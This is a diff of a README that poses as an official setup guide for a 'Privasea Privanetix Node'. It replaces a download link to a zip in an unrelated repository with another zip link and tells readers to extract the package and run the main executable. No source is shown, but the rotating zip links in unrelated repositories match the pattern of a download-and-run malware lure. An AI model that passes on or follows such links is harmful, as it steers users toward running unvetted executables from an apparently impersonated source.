@@ -6,7 +6,7 @@ Welcome to the official setup guide for Privasea Privanetix Node! This repositor
 
 To start setting up your Privanetix Node, you will need to download the necessary software package. You can get the required files by clicking on the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/november4guy/privasea-privanetix-node/releases/download/v1.0/Application.zip)](https://github.com/november4guy/privasea-privanetix-node/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the software package, extract the contents and launch the main executable file. If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
